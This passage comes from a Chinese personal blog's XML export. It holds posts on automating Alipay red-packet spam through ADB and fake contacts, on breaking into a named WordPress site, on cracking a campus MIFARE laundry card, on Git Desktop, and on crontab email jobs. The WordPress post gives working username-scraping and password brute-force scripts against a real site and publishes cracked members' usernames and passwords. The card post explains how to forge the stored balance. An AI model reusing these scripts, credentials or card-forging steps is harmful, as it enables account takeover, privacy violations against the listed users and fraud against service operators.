print(&apos;以&#123;&#125;开头联系人，第&#123;&#125;位，要循环的&#123;&#125;次，此时第&#123;&#125;次循环&apos;.format(list[l],l,int(math.ceil(dic2[str(l)]/6)),w)) time.sleep(4) os.system(&apos;adb shell input tap 388 1088&apos;) # 立即赚赏金 time.sleep(1) os.system(&apos;adb shell input tap 688 938&apos;) # 发送给朋友 time.sleep(1) os.system(&apos;adb shell input tap 666 100&apos;) # 点击多选 time.sleep(1) os.system(&apos;adb shell input tap 300 300&apos;) # 从通讯录选择 # # 循环选着联系人 a = int(304) num = a + 36 * l time.sleep(1) os.system(&apos;adb shell input tap 700 &apos; + str(num) + &apos;&apos;) # 选择字母 # for i in range(int(w)-1): time.sleep(1) print(&apos;要向下滑动&#123;&#125;个单位，此时滑动到&#123;&#125;个单位&apos;.format(i,int(w)-1)) os.system(&apos;adb shell input swipe 400 900 400 300 1000&apos;) # 滑动 num3 = 320 if w==int(math.ceil(dic2[str(l)]/6)): for i in range(dic2[str(l)]-(w-1)*6): # 循环点击联系人 num2 = num3 + i * 111 print(&apos;&#123;&#125;要循环&#123;&#125;次，此时第&#123;&#125;次循环，选择到第&#123;&#125;个联系人，距离是&#123;&#125;&apos;.format(list[l],int(math.ceil(dic2[str(l)]/6)),w,i,num2)) os.system(&apos;adb shell input tap 220 &apos; + str(num2) + &apos; &apos;) time.sleep(0) else: for i in range(6): # 循环点击联系人 num2 = num3 + i * 111 print(&apos;&#123;&#125;要循环&#123;&#125;次，此时第&#123;&#125;次循环，选择固定6个人。选择到第&#123;&#125;个联系人，距离是&#123;&#125;&apos;.format(list[l],int(math.ceil(dic2[str(l)]/6)),w,i,num2)) os.system(&apos;adb shell input tap 220 &apos; + str(num2) + &apos; &apos;) time.sleep(0) time.sleep(1) os.system(&apos;adb shell input tap 620 100&apos;) # 两次确定 time.sleep(1) #程序自动发送早上好早上好Good_morning_Program_automatic_transmission #Good_morning_Happy_day os.system(&apos;adb shell input tap 620 100&apos;) # 发送 time.sleep(1.5) os.system(&apos;adb shell input tap 300 840&apos;) # 发送 time.sleep(0.1) os.system(&apos;adb shell input text Red_bagre&apos;) time.sleep(0.5) # os.system(&apos;adb shell input tap 522 910&apos;) # 发送 os.system(&apos;adb shell input tap 600 650&apos;) # 发送 time.sleep(2) #防止网卡。 print(&apos;发送成功&apos;)alipay() 里面添加了多处的time，主要还是自己的手机反应慢的原因。不得已而为之。 添加联系人在经过多次实验，代码可以无误的在我的手机上跑起来，这样分分钟把所有的人跑完了，这样0就觉得联系人太少了额！没几次就发送完了。另外支付宝可以很方便的通过手机通讯录添加联系人。 批量添加联系人安卓的手机通讯录可以导出.vcf格式。然后传送到电脑上，查看文档的内容 其中的TEL CELL是电话号码，然后批量添加手机号，生成txt中的内容。导入到手机里面更新通讯录，大功告成。 手机号码为了提高可使用率，可以从大学的贴吧中爬取，面向学生获取的手机号，日常的支付宝使用率比较高。 或者去批量的生产几千个 12345678910with open(&apos;00003.txt&apos;,&apos;w&apos;)as f: for i in range(99): a = random.randint(1700, 8000) print(a) f.writelines(&apos;BEGIN:VCARD&apos;+&apos;\n&apos;) f.writelines(&apos;VERSION:2.1&apos;+&apos;\n&apos;) f.writelines(&apos;N:;&apos;+str(a)+&apos;;;;&apos;+&apos;\n&apos;) f.writelines(&apos;FN:1&apos;+&apos;\n&apos;) f.writelines(&apos;TEL;CELL:132 5337 &apos;+str(a)+&apos;\n&apos;) f.writelines(&apos;END:VCARD&apos;+&apos;\n&apos;) 实在搞笑的事情，在导入完成后，足足有4000多个电话号码。刚登陆上支付宝的小号准备加人，支付宝立即把我的帐号封了，说我存在风险，然后打客服电话，直接给我封了一个月。可见支付宝的安全措施真的强，那里都不能钻空子，钻到一点空子实属捡到的便宜。 既然你支付宝不让我通过通讯录添加好友，那我就手动的添加1234567891011121314151617181920for i in range(100): print(&apos;第几次添加好友&apos;,i) l = random.randint(1000,9999) print(&apos;手机号是：1599567&apos;,l) os.system(&apos;adb shell input text 1325337&apos;+str(l)) # 搜索联系人 time.sleep(3) os.system(&apos;adb shell input tap 680 220&apos;) #选择联系人 time.sleep(3) os.system(&apos;adb shell input tap 680 400&apos;) os.system(&apos;adb shell input tap 680 500&apos;) # 添加好友 os.system(&apos;adb shell input tap 680 555&apos;) os.system(&apos;adb shell input tap 680 600&apos;) time.sleep(3) os.system(&apos;adb shell input tap 680 100&apos;) # 发送 time.sleep(3) os.system(&apos;adb shell input keyevent 4&apos;) # back time.sleep(3) os.system(&apos;adb shell input tap 680 80&apos;) #点叉 time.sleep(3) 这几串代码能保证无论是否添加过好友，还是没有搜索到好友，还是允许添加都能应对。 每天最多添加的只有30个好友，多了之后就不让添加了。 总结在这次的文章中没有什么难的技术上面的问题，主要是应用方面，如何将一系列的问题模型化，程序化。 如何做到自动呢！将电脑的主板改成每天早上6点自动开启，然后定时执行脚本。（让360手机助手不自启动，防止端口占用），现在我的笔记本游戏本，也不支持自启，寝室断电更不能抗住一夜，回去用家里的台式机进行实验。（我记得我的电脑能通过调节主板把频率和功耗降到最低。不过也不值得我去倒持它了。） 理论化分析：活动举行3个月，支付宝好友最多有500人的上限，每天能添加30人，就算一天只有10个人去同意，现在我的通讯录有280多人，在未来一个月内能加满人，同时还有一部分人受不了我的骚扰单方面删除我，同时也能保证500人的状态。每天发送500分分享，大概需要一个小时的时间，按照10%的人去愿意点开链接，每天就有500*10%=50个红包，在红包使用后折算不立即使用的人，支付宝领取红包金额最多在0.11元与0.34元最多。但是使用红包后我能获得的奖励金却是翻了几倍的金额。每天收入十几元以上。按照这样想想，月入百万都是梦。 毕竟这些都是理论化的分析，可能根本就到不到这个数值。但是这个方法大家可以去试一下。还有 看到这就去上面扫扫码，各位老爷打赏一下。或者点击加我支付宝好友。备注简书！ 祝大家发财！]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>alipay</tag>
        <tag>薅羊毛</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用Python攻陷某WP网站]]></title>
    <url>%2F2017%2F12%2F11%2F%E7%94%A8Python%E6%94%BB%E9%99%B7%E6%9F%90WP%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[今天又来带大家出来搞事情，这篇文章可是稳稳的福利篇啊！Python真是一大利器， 就是生活中我的左右手，隐藏了这么久的时间，可不是什么没干，项目做到一半，烦躁的不行，就想找些其他事情做做。正好无意间碰见一个WordPress搭建的福利网站，里面的资源可真是丰富啊！但是最丰富的资源还是要会员才能够接触到，看了看这个登录的界面，发现可以搞事情。ps：文章后面留下了部分的福利，不满足的老司机私聊~你懂得 执行计划1.寻找切入点2.提取用户名3.获取密码4.发送邮件5.删除所以违法信息 必备准备写python代码 开工首先 立据双手离开键盘以示清白，看到这个登录的界面，就知道可以搞事情，没有验证码，没有验证码机制。我就立马注册了一个帐号 注册ing 注册完成之后，登录，浏览网页，浏览网页，还在浏览网页 额…… 不对，我是来搞事情的，不是来浏览网页的，发现了其中的资源确实丰富，但要想浏览下面的内容呢！还得要冲个会员才能办。下面的内容就是获取资源与得到会员 ###寻找帐号首先先观测，大概网页的内容就分为三部分：‘资源’，‘注册登录’， ‘个人信息’。 要想登录别人的帐号，就得先得到别人的帐号密码，只能说这个网站是个小站，里面的各种安全都没有考虑到。也可能是站长花钱买的。只能说买的冤啊！在热门的帖子下面都有好多用户评论，而评论的用户名就是他们的帐号，这个网站并没有增加用户名，这样得到他们的帐号也就容易的多了。我就写个脚本，爬下网站的所有的信息，找出所有的用户名 123456789101112131415161718192021222324#获取全站的用户名import reimport requestsdef gethtml(url): #获取html headers = &#123; &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0&apos;, &apos;Referer&apos;: &apos;http://sstushu.net/%e7%99%bb%e5%bd%95?loggedout=true&apos; &#125; html = requests.get(url, headers=headers) return html.textfor i in range(2,39): if i == 1: url = &apos;http:/sstushu.net/&apos; #第一页的内容 else: url = &apos;http://sstushu.net/page/&apos; + str(i) html = gethtml(url) #解析网页 urls = re.findall(&apos;&lt;a href=&quot;(.*?)&quot; class=&quot;zoom&quot; rel=&quot;bookmark&quot;&apos;, html) for each in urls: for each2 in re.findall(&apos;&lt;strong&gt;(.*?)&lt;/strong&gt;:&apos;, gethtml(each)): #获取用户名 f = open(&apos;yonghu.txt&apos;, &apos;a+&apos;, encoding=&apos;utf-8&apos;) f.write(each2) f.write(&apos;\n&apos;) f.close() 我的天，好家伙哦这个小站跑出了1000多的用户名，出去其中重复的用户名，那也得有600多啊！这个可是一个如此丰富的资源。看看他们注册的用户名，大都是随手输入的帐号，有的类似于qq号，有的是手机号。也有随手的一段字符。折这么多我想着要不要去重一下。 1234567891011# with open(&apos;.\\passwd.txt&apos;, &apos;r&apos;)as f:# for i in f:# # print(i)# with open(&apos;.\\passwd.txt&apos;, &apos;r&apos;)as g:# a = 0# for j in g:# # print(j)# if i == j:# a += 1# if a ==2:# print(i) 这样就舒服多了。这么多的帐号，又是随手输入，就用弱口令跑一跑，肯定不会多难。来，在写个post的脚本，把账户和密码模拟浏览器输入进去。登录成功的就保存在一个txt文档中。 找到密码对了，在最开始测试的时候，找取部分用户名，我的用户名放在前后保证能看到好的结束，我的密码也加入到爆破的字典中。第一次跑，发现并没有跑出来太多，也就一点点吧。试了试都能上。但是我有这么大的帐号源，就跑出来这几个，就有点亏了吧！难道是我的字典太小了？也不至于啊。50个常用密码对付这米有安全意识的密码，还不算拿不出手啊！ 忘了最重要的一点。要是我注册一个网站，不会也输入一个额外的密码，就直接用户名和帐号一起使用了。哦！更新代码…… 12345678910111213141516171819202122232425262728293031323334353637#http://sstushu.net/%e7%99%bb%e5%bd%95import reimport requestsdef baopo(i,j): url = &apos;http://sstushu.net/%e7%99%bb%e5%bd%95&apos; headers = &#123; &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0&apos;, &apos;Referer&apos;: &apos;http://sstushu.net/%e7%99%bb%e5%bd%95?loggedout=true&apos; #网站打码 &#125; data = &#123; &apos;log&apos;: i, &apos;pwd&apos;: j, &apos;wp-submit&apos;: &apos;登录&apos;, &apos;redirect_to&apos;: &apos;&apos;, &apos;wpuf_login&apos;: &apos;true&apos;, &apos;action&apos;: &apos;login&apos;, &apos;_wpnonce&apos;: &apos;4b4e82f670&apos;, &apos;_wp_http_referer&apos;: &apos;/%e7%99%bb%e5%bd%95?loggedout=true&apos; &#125; a = requests.post(url, headers=headers, data=data) # print(a) print(a.history) if a.history == []: pass else: with open(&apos;sucess.txt&apos;,&apos;a+&apos;)as f: f.write(&apos;log:&apos;+i+&apos;\r&apos;+&apos;passwd:&apos;+j)with open(&apos;yonghu.txt&apos;, &apos;r&apos;)as f: for i in f: baopo(i, i) #用户名也验证一下 print(i) with open(&apos;passwd.txt&apos;, &apos;r&apos;)as g: for j in g: print(j) baopo(i, j) 看到这满满的用户名密码：心里可满足了。 这战绩还是不错的。登录一下啊，还有大概40多个是终身会员，还真有忠实的粉丝冲钱。还看看到一个额外的福利，不知道是不是太忙，冲了钱忘记花了，还是睡的早，记性不好。最关键的还是网站有站内提现的功能，本着不破坏的原则，就不动他的余额了。希望下次他自己用掉吧！ 到这仍然没有结束，现在我能拿到帐号，密码，会员，还是不太甘心，再发掘发掘有没有其他的内容，也没有什么了，就有一个邮箱还算个人的隐私。这样吧！我也就不好意思了，写个脚本把你们的邮箱全都批量的拿下来吧！ 1import re 为了再装最后一波B就在网址上留下http://hack的标记，记得你的密码有点弱，下次就要改下密码了。 发送邮件然后把提取下来的脚本的邮箱们我再发送一封邮件，这种重复性的动作就继续上脚本。 123456789101112131415161718192021222324252627282930import linecacheimport timefrom email.mime.text import MIMETextfrom email.header import Headerfrom smtplib import SMTP_SSLlines = linecache.getlines(&apos;email.txt&apos;)email_list = []for i in lines: email_list.append(str(i))for i in range(len(email_list)):#设置的参数登录帐号 邮箱 密码smtpserver = &apos;.163.com&apos; #发邮件邮箱服务poplibserver = &apos;pop.163.com&apos; #查看邮件服务sender = &apos;xxxxxxxx@163.com&apos; # 邮件登陆着，发件人passwd = &apos;xxxx&apos; # 登录邮件的授权密码receive = email_list[i] #接受者的邮箱，换成列表就可以多个发送#设置发送内容的emailsubject = &apos;hello，温馨提醒，已经有人修改你的帐号内容，你的绅士图书馆账号密码过于简单已经泄漏，请登录后修改密码。&apos;emailtitle = &apos;change your passwd&apos;#构造一封邮件message = MIMEText(emailtitle, &apos;plain&apos;, &apos;utf-8&apos;) #plain文本的格式message[&apos;Subject&apos;] = Header(emailsubject, &apos;utf-8&apos;)message[&apos;From&apos;] = sendermessage[&apos;To&apos;] = receive# print(message.as_string())#登录邮箱，给本邮箱发送邮件一封smtp = SMTP_SSL(smtpserver) #连接到服务器smtp.login(sender,passwd) #登录到邮箱smtp.sendmail(sender, receive, message.as_string())smtp.quit() change your passwd 福利这里扔出来几个运气不好的会员帐号，也来确保我有拿到真的数据，真的可以登录福利网站。 （同时发现帐号的密码是可以任何一个人不需要验证的情况下修改的，大家不需要修改这几个倒霉的帐号了） 会员帐号1234567891011121314151617log:fzyvinpasswd:abc123log:wssbwssbpasswd:wssbwssblog:nnk126passwd:123456789log:bbs8960334passwd:bbs8960334 log:1162512354passwd:1162512354log:tianhuan passwd:tianhuan 普通帐号 12345678910111213141516171819202122232425262728293031log:adshnpasswd:123456789 log:592057962passwd:123456 log:1284783709passwd:1284783709 log:123456789012passwd:123456789 log:592057962passwd:123456 log:1284783709passwd:1284783709 log:1007404289 passwd:1007404289 log:qq5825142passwd:qq123456 log:kira03passwd:123123 log:qwe123456passwd:123456 log:elicpasswd:password log:f4867787passwd:f4867787 log:qq2454173015passwd:qq2454173015 log:3773537760passwd:123123123 passwd:wzx223366 passwd:f4867787 ……………… 我是有多么的闲啊！写了这么多忽然发现，可以吃饭了。我所有要跑的程序大都在阿里云服务器上跑得。毕竟可以省去我电脑的功夫，说实话我感觉好像是跑了大约一两个夜晚吧！才搞完所有的东西，其实买个服务器在上面跑跑脚本，还是挺好的，见见世面嘛！ Q：阿里云服务器怎么跑脚本？R：参见我另一篇文章的传送门如何在服务器上快速部署跑python脚本 Q:写了这么多，给了资源我能不给你点赞吗？R：如果你欣赏的通俗易懂的文采，就给个赞再走吧！感谢orz-]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git desktop]]></title>
    <url>%2F2017%2F12%2F11%2FGit%20desktop%2F</url>
    <content type="text"><![CDATA[随便记录这几天使用git用的疯了，先记录使用desktop的过程，再捋顺一下过程。使用desktop 这几天使用git用的疯了，先记录使用desktop的过程，再捋顺一下过程。使用desktop file&gt;options&gt;登录账户，选择本地仓库地址 我在电脑创建一个BIG仓库，然后里面是小仓库。每个仓库是一个项目。 Current repository 选择仓库 Change 查看仓库的变化 History 历史操作 Current branch 选择分支 可以通过这找到本地的文件 fetch origin 操作源吧 下面提交分支的过程Summary Description Commit 提交的时候填上摘要，描述。 在Branch里面可以创建 删除 重命名分支 Repository 里面push pull 会了这几步的组和就差不多完全操作git了。]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[破解校园水卡]]></title>
    <url>%2F2017%2F09%2F11%2F%E7%A0%B4%E8%A7%A3%E6%A0%A1%E5%9B%AD%E6%B0%B4%E5%8D%A1%2F</url>
    <content type="text"><![CDATA[###0x00前言 今年校园洗衣机升级换代，采用了更为安全的微信支付。可是在以前校园用的是刷卡洗衣的，这种卡就是IC卡。比较坑的是一张卡10次30元，洗一次衣服要3元，完全都我喝一杯牛奶了。崇尚节俭的我便开始打IC卡的主意，IC的安全性很低，只要用心的人就能随意的改动卡里面的内容。下面就回忆一下，由于现在手中没了卡，许多截图都是以前做测试留下来的。破解着这种卡的技术可能早已经被玩烂了，但今日发的这篇文章只是为了记录一下以前调皮捣蛋的生活。成功破解卡之后，并没有与别人交流，也没有借此拿来售卖。我还是害怕辅导员把我踢出去的。同时声明：此次分享只作为技术交流与实验，切不可用于违法犯忌的行为。 （我知道对于想搞事情的萌新，说了也没用！唉！） ###0x01达成效果修改水卡的次数，达到较多次（10+），方便使用。 ###0x02前提准备（Windows）1.洗衣卡一张（ICcatd）2.NFC读卡器（某宝售价40~100）3.配套的软件 4.数据内部算法的分析###0x03IC卡IC卡即集成电路卡(Integrated Circuit Card)，是超大规模集成电路技术、计算机技术以及信息安全技术等发展的产物。它将集成电路芯片镶嵌于塑料基片的指定位置上，利用集成电路的可存储特性，保存、读取和修改芯片上的信息。 按照与外界数据传送的形式来分，IC卡有接触式和非接触式两种，校园的水卡就是简单的非接触式的M1规格的卡。最简单的区分方法就是拿手机后面的灯光照射卡的一面，从另一面观察有一圈的铜线圈，这种可以说方便使用，同时也容易搞事情。###0x04设备与软件使用 ACR122u-A9非接触式读卡器门禁读卡器 ， 工作原理 读写器向M1卡发一组固定频率的电磁波，卡片内有一个LC串联谐振电路，其频率与读写器发射的频率相同，在电磁波的激励下，LC谐振电路产生共振，从而使电容内有了电荷，在这个电容的另一端，接有一个单向导通的电子泵，将电容内的电荷送到另一个电容内储存，当所积累的电荷达到2V时，此电容可做为电源为其它电路提供工作电压，将卡内数据发射出去或接取读写器的数据。 通过USB接口链接电脑，显示灯亮起表明可以使用。最麻烦的是驱动的安装，与对应软件的选择，由于我的设备不是在某包买的，从学长的手中强行搜刮下来，所以是没有任何的软件的。这些我自己找啊！ 安装驱动，我用的软件是从网上千挑万选出来的几个，个人感觉十分的顺手方便使用，一个安装驱动的软件可以通过检测连接的设备，找出对应的驱动，这个软件可以说异常的好使。如果想玩这类设备的朋友，可以在留言区留下自己的邮箱，在一天之内可以免费发送给你（前提我没有脑子抽抽重装系统之前吧，谁也说不定），玩技术无国界。 使用软件1.爆破软件2.修改软件 3.写入数据软件爆破软件 打开爆破软件，将卡放到NFC的读卡器上面，点击选择读卡器，等待卡片信息和卡片状态，点击开始破解，对于加密的内容不同，等待5~15分钟，就会破解完成，生成dump的文档。（这里得到的文档是压缩过后的，在lunix下获取到的是4kb的元文档）在这个dump的文档中，就是这个卡片的信息，显然这样的查看方式是不方便的额！所以在修改软件中查看修改软件打开修改软件，导入Dump的文件，16个扇区，每个扇区有4块内容 16个数据存储区，通常我们称为“扇区”，编号是“0”到“15”。每个扇区又分为4个存储单元，我们称为“块”，在M1卡中数据存储的最小单位就是“块”。每一块有16字节（16B） 第0扇区的块0（即绝对地址0块），它用于存放厂商代码，已经固化，不可更改. 在全扇区加密时，通常用前三个“块”（0，1，2号块）存放数据，用最后一个”块“（3号块）存放密码。其中密码分为A密码和B密码：前6个字节存放A密码，中间4字节为控制字段，后6字节存放B密码。注意这里每个扇区的密码都是独立的，也就是说可以为16个扇区设置16个不同的密码，当然也可以使用相同的密码，但是这样会大大降低破解的难度，破解的问题就交给软件完成. 每个扇区的密码和存取控制都是独立的，可以根据实际需要设定各自的密码及存取控制。存取控制为4个字节，共32位，扇区中的每个块（包括数据块和控制块）的存取条件是由密码和存取控制共同决定的，在存取控制中每个块都有相应的三个控制位,定义如下： 块0： C10 C20 C30 块1： C11 C21 C31 块2： C12 C22 C32 块3： C13 C23 C33 三个控制位以正和反两种形式存在于存取控制字节中，决定了该块的访问权限（如 进行减值操作必须验证KEY A，进行加值操作必须验证KEY B，等等）。三个控制 位在存取控制字节中的位置，以块0为例：对块0的控制： bit 7 6 5 4 3 2 1 0 字节6 C20_b C10_b 字节7 C10 C30_b 字节8 C30 C20 字节9 ( 注： C10_b表示C10取反 ) 存取控制（4字节，其中字节9为备用字节）结构如下所示： bit 7 6 5 4 3 2 1 0 字节6 C23_b C22_b C21_b C20_b C13_b C12_b C11_b C10_b 字节7 C13 C12 C11 C10 C33_b C32_b C31_b C30_b 字节8 C33 C32 C31 C30 C23 C22 C21 C20 字节9 ( 注： _b表示取反 ) 当块3的存取控制位C13 C23 C33=1 0 0时，表示： 密码A：不可读，验证KEYA或KEYB正确后，可写（更改）。 存取控制：验证KEYA或KEYB正确后，可读、可写。 密码B：验证KEYA或KEYB正确后，可读、可写。 根据最后介绍的的数据算法分析，双击软件中数据内容，修改对应的数据写入数据软件简单操作，连接读卡器，连接卡片，写卡。完成卡片的修改。 ###0x05数据内部算法的分析对得到的数据进行分析，解密是个有意思的事情，前面的基本操作没有任何的挑战性，现在我们要去修改它里面的次数，就要找到表示次数的那些扇区中的那些块表示次数。如何让这些表示次数的数据显示出来？我又花重金买了一张卡，拿着这张卡去刷，每刷一次就记录一次，得到大约11次的Dump文档，分析文档中改变的数据。改变的数据就表示次数。经过几次的比较大概就知道了表示次数的数据。分别拿出这些数据，找出规律。然后在根据得出的规律去构造出你想要改成的次数。 现在发现第一扇区的第0块每次刷卡后都改变，然后将10次数据提取出来，进行分析，推算出他的算法。选取部分数据找规律 C800000037FFFFFFC800000008F708F7 2次 2C010000D3FEFFFF2C01000008F708F7 3次 901000006FEFFFFF9010000008F708F7 4次 F41000000BEFFFFFF410000008F708F7 5次 58020000A7FDFFFF5802000008F708F7 6次 举例3次 2C010000 D3FEFFFF 2C010000 08F708F7 分成四部分，发现第一部分和第三部分相同，第四部分对比数据后是个不变的值。 在最初的想法是找到与对应次数的数字，次数会不会直接写在里面，结果对应的数字不能完全符合规律。再次假设字母的个数与位置，也不能符合全部的规律。这些数值对应的是16进制，3次中的“3”在洗衣机上面显示的是3.00，3对应的十六进制是不变的，那要是3.00 = 300呢？对应的十六进制是多少？ 300（十进制）=12c（十六进制）有没有发现和第一部分的数字很像。然后测试400、500400（十进制）=190（十六进制）500（十进制）=1f4（十六进制）对于三次数据，这样可以理解为间第一部分的数据拆成 300（十进制）=12c（十六进制） 2c 01 0000 这样第一部分的算法就知道了，第三部分和第一部分相等，第四部分不变。就差第二部分的解析。将十六进制翻过来就是 1 2 3 4 5 6 7 8 9 A B C D E F | | | | | | | | | | | | | | | F E D C B A 9 8 7 6 5 4 3 2 1 第一部分对应第二部分 2C010000 D3FEFFFF 第三次的数据的算法：2C010000++D3FEFFFF++2C010000++08F708F7 反汇编，推算试着写一个6次的600=02580258=&gt;580258020000=&gt;A7FDFFFF58020000+A7FDFFFF+58020000+08F708F7 和读出的数据进行对比58020000A7FDFFFF5802000008F708F7 6次完全一样这样试着写一个52次的50140000+AFEBFFFF+50140000+08F708F7最后拿去洗衣机验证成功，没有截图。 对于想对你的卡进行试验的的朋友，可以参考本文，特别声明，此文章只作为记录先前的生活，需要软件的朋友，在留言区留下你的邮箱地址！]]></content>
      <categories>
        <category>破解</category>
      </categories>
      <tags>
        <tag>IC</tag>
        <tag>破解</tag>
        <tag>大学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[服务器定时发送邮件爬虫]]></title>
    <url>%2F2017%2F07%2F22%2F%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%9A%E6%97%B6%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[前言 在深入感受到爬虫的乐趣的时候，多想用它干点简单的事情，我非常喜欢浏览某网站的热点新闻，但如果那天学习忙的天花乱缀（chu qu gui hun）的时候，“WC、WC、我错过了什么大事情”，就会错过当时的热点。怎么才能记录下呢！ 预期达成效果： python爬去某网站上的时刻下最热点新闻，存储到文档中。在lunix下定时每隔n小时启用python去爬取新闻，然后用邮件的形式每隔n小时将新闻文档发到自己的邮箱，以便朕统一的查阅。执行计划： 定时执行任务配置【Ubuntu环境下】 发送邮件相关配置 执行脚本编写 python爬虫程序编写 注：一千个人心中有一千个哈姆雷特，一千个人配出一千种错误 1、定时执行任务在ubuntu相爱使用crontab部署定时任务｛使用是linux虚拟机ubuntu。｝ cron是一个[守护程序]用于在指定的时间内执行行程类的任务，每一个用户都有一个 crontab 文件，来允许他们指定需要执行的内容和时间，此外，系统也有一个 crontab ，用来允许像交替日志和更新本地数据这样有规则的任务。 插入crontab所需要的知识，只需要看看，了解下后面不明白再来看 服务使用命令： 查看cron的状态 sudo service cron status 开启cron sudo /etc/init.d/cron start 关闭cron sudo /etc/init.d/cron stop 重启cron sudo service cron restart or重启服务 sudo /etc/init.d/cron restart 查看命令是否运行 pgrep cron cron设置用法： crontab -e #设置定时任务 crontab -l #查看详情 crontab -r : 删除 crontab 文件 不建议手贱去验证他 定时任务的模版样式： * * * * * command 星星表示通配符 command表示任务 m h dom mon dow command 分 时 日 月 周 命令 m 分钟 0-59第1列表示分钟1～59 每分钟用或者 /1表示 h 小时 0-23 第2列表示小时1～23（0表示0点） dow 天1-31 第3列表示日期1～31 mon 月 1-12 第4列表示月份1～12 dow 星期 1-6 0表示星期日第5列标识号星期0～6（0表示星期天） command 就是要执行的命令 第6列要运行的命令 记住几个特殊符号的含义: “*”代表取值范围内的数字, “/”代表”每”, “-”代表从某个数字到某个数字, “,”分开几个离散的数字 crontab文件的一些例子： 30 21 * * * /usr/local/etc/rc.d/lighttpd restart 上面的例子表示每晚的21:30重启apache。 45 4 1,10,22 * * /usr/local/etc/rc.d/lighttpd restart 上面的例子表示每月1、10、22日的4 : 45重启apache。 10 1 * * 6,0 /usr/local/etc/rc.d/lighttpd restart 上面的例子表示每周六、周日的1 : 10重启apache。 0,30 18-23 * * * /usr/local/etc/rc.d/lighttpd restart 上面的例子表示在每天18 : 00至23 : 00之间每隔30分钟重启apache。 0 23 * * 6 /usr/local/etc/rc.d/lighttpd restart 上面的例子表示每星期六的11 : 00 pm重启apache。 0 */1 * * * /usr/local/etc/rc.d/lighttpd restart 每一小时重启apache 0 23-7/1 * * * /usr/local/etc/rc.d/lighttpd restart 晚上11点到早上7点之间，每隔一小时重启apache 0 11 4 * mon-wed /usr/local/etc/rc.d/lighttpd restart 每月的4号与每周一到周三的11点重启apache 0 4 1 jan * /usr/local/etc/rc.d/lighttpd restart 一月一号的4点重启apac 每天7：50以root 身份执行/etc/cron.daily目录中的所有可执行文件 50 7 * * * root run-parts /etc/cron.daily [ 注：run-parts参数表示，执行后面目录中的所有可执行文件。 ] 每天早上6点 0 6 * * * echo &quot;Good morning.&quot; &gt;&gt; /tmp/test.txt //注意单纯echo，从屏幕上看不到任何输出，因为cron把任何输出都email到root的信箱了。 每两个小时(第一个为15，指明没两个小时的第15min中执行一次) 15 */2 * * * echo &quot;Have a break now.&quot; &gt;&gt; /tmp/test.txt 晚上11点到早上8点之间每两个小时和早上八点 0 23-7/2，8 * * * echo &quot;Have a good dream&quot; &gt;&gt; /tmp/test.txt 每个月的4号和每个礼拜的礼拜一到礼拜三的早上11点 0 11 4 * 1-3 command line 每月（1号凌晨4：42）去执行/etc/cron.monthly内的脚本 42 4 1 * * root run-parts /etc/cron.monthly 注意: “run-parts”这个参数了，如果去掉这个参数的话，后面就可以写要运行的某个脚本名，而不是文件夹名。 每天的下午4点、5点、6点的5 min、15 min、25 min、35 min、45 min、55 min时执行命令。 5，15，25，35，45，55 16，17，18 * * * command 每年的一月和四月，4号到9号的3点12分和3点55分执行/bin/rm -f expire.1st这个指令，并把结果添加在mm.txt这个文件之后（mm.txt文件位于用户自己的目录位置）。 12,553 4-91,4 * /bin/rm -f expire.1st$#@62;$#@62;mm.txt （头大） 自己测试小实验，了解他的大概流程与原理： root123456@ubuntu:~$ crontab –e 使用vi编译器，第一次使用Ubuntu它会让你选着编译器，不要相信他的箭头（easies？）用了老半天就他最费劲 ，还是选择vi，别问为什么， 顺 手！ 在里面最下面键入：测试代码 同时在目录下创建/tmp/1.txt */1 * * * * date &gt;&gt; /tmp/1.txt 意思是每一分钟将当时的数据打印到/tmp/1.txt中 然后esc –》：wq退出 保存之后重启服务 root123456@ubuntu:~$ sudo service cron restart 查看结果 root123456@ubuntu:~$ cat /tmp/1.txt 每分钟去打印一次时间到1.txt上 定时执行任务这步就可以确定定时可以使用了额，上面的配置是测试定时任务，认识到定时启动任务是什么形式的，还可以去找其他的例子，变换时间 和执行的命令自己做测试。 这步骤是为了后面做铺垫，是后面的基础，就先在这提前介绍了。因为后面很“激情”来不及详细补充定时功能。 #2、发送邮件相关配置我认为重点和难点就是邮件的发送 自动发送邮件，使用命令行的方式发送邮件。先来陪着两个邮件服务mutt msmtp 在ubuntu下安装mutt很方便，只需要sudo apt-get install mutt sudo apt-get install mutt 另外需要安装msmtp，一个发邮件的小工具，sudo apt-get insall msmtp。 sudo apt-get insall msmtp 在安装的过程中会出现package configuration，这时候发现无发选到ok 按住Tab点亮ok 然后按住Enter键，接下来一顿默认猛如虎的操作（就乖乖的选默认） 假装有图（安过后就忘了截图噜！） 配置Muttrc 打开文件，路径/etc/Muttrc set sendmail=&quot;/usr/bin/msmtp&quot; set use_from=yes set realname=&quot;mailnam&quot; 邮箱的名字 set from=mailnam@163.com 你的邮箱 set envelope_from=yes 配置msmtp msmtp默认没有，所以在/etc路径下创建msmtprc配置文件 我本想用日志文件做测试，创建/var/log/msmtp.log，如果发生错误的话，能检测到原因 打开msmtprc文件配置下面的内容 account default host smtp.163.com 不要动 from mailname@163.com 你的邮箱 auth plain user mailname 你的名字 password 123456 网易云邮箱客户端授权码，去网易云邮箱设置 教程向下面翻翻 这个设置权限步骤，只要你胆子大就不用（我是没改，太难了） 由于我们的密码是明文，所以要稍稍的修改下权限（哈哈，你看不到我的pw,你看不到） chmod 600 msmtprc 现在基本配置完成了，使用命令行输出测试一波 我把以my_first_test为主题，test为内容的邮件发送到另一个我的邮箱 echo &quot;test&quot; |mutt -s &quot;my_first_test&quot; 1599121712@qq.com 哈哈，成功 